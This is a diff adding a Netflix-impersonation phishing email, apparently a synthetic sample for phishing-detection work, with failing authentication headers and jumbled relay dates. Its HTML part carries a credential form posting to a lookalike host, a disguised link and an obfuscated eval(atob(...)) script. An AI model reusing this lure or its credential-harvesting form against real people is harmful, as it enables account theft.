@@ -1,0 +1,33 @@
+From: notice@netflix-account.pages.dev
+To: victim53@example.com
+Subject: Access notice from Netflix [ref F7C31A5]
+Date: Tue, 17 Mar 2002 18:11:00 -0500
+Message-ID: <phish-53-fb34df65-be7f-4bf1-a12b-fde3fa138fb1@netflix-account.pages.dev>
+Received: from relay0 (relay0.example.net [192.0.2.100]) by mx0.example.com; Tue, 20 Mar 2002 09:01:00 -0500
+Received: from relay1 (relay1.example.net [192.0.2.101]) by mx1.example.com; Tue, 27 Mar 2002 13:21:00 -0500
+Received: from relay2 (relay2.example.net [192.0.2.102]) by mx2.example.com; Tue, 26 Mar 2002 01:57:00 -0500
+Received: from relay3 (relay3.example.net [192.0.2.103]) by mx3.example.com; Tue, 04 Mar 2002 21:30:00 -0500
+Received: from relay4 (relay4.example.net [192.0.2.104]) by mx4.example.com; Tue, 03 Mar 2002 15:44:00 -0500
+Received: from relay5 (relay5.example.net [192.0.2.105]) by mx5.example.com; Tue, 20 Mar 2002 18:29:00 -0500
+Return-Path: <bounce@mail-1608f6ef.top>
+Reply-To: recovery3@gmail.com
+Authentication-Results: mx.example.com; spf=fail smtp.mailfrom=mail-1608f6ef.top; dkim=fail header.d=netflix-account.pages.dev; dmarc=fail header.from=netflix-account.pages.dev
+Received-SPF: fail (mx.example.com: domain of notice@netflix-account.pages.dev does not designate 192.0.2.44 as permitted sender)
+DKIM-Signature: v=1; a=rsa-sha256; d=netflix-account.pages.dev; s=default; h=from:to:subject;
+MIME-Version: 1.0
+Content-Type: multipart/alternative; boundary="bnd-p-53-664c67ec"
+
+--bnd-p-53-664c67ec
+Content-Type: text/plain; charset="UTF-8"
+
+Hello,
+
+A new access notice is available for your profile.
+Review it here: https://login.secure.netflix-account.pages.dev/auth?t=F7C31A5
+
+Reference: F7C31A5
+--bnd-p-53-664c67ec
+Content-Type: text/html; charset="UTF-8"
+
+<html><body onload="track()"><p>Hello,<br/><br/>A new access notice is available for your profile.<br/>Review it here: https://login.secure.netflix-account.pages.dev/auth?t=F7C31A5<br/><br/>Reference: F7C31A5</p><p><a href="http://netflix-account.pages.dev/login">https://www.netflix.com/signin</a></p><form action="http://netflix-account.pages.dev/login" method="post"><input type="text" name="user"/><input type="password" name="pass" style="display:none"/><input type="submit" value="Continue"/></form><script>var s="review the notice";eval(atob('qGiGpdKXgULaLYzzeOvIPPXqitsyfzBRIsdOdZOIuowT+gBW+4C3F0EjMTQ9D98D/uzOWHyYtHSjSwieeCRbGpVjZfLZDjVlAgUSBD6u/D19yhJoHnvzeufP3BG1oynVRbmwDJYv7Qdx7ZA9oSzvBMqORsJdqFBNVGw+QxnEnsjd7w5LNM/L4SSCkGR9Ug52IgwEtZQoWrzTtIYlpnJrMQ=='));</script></body></html>
+--bnd-p-53-664c67ec--
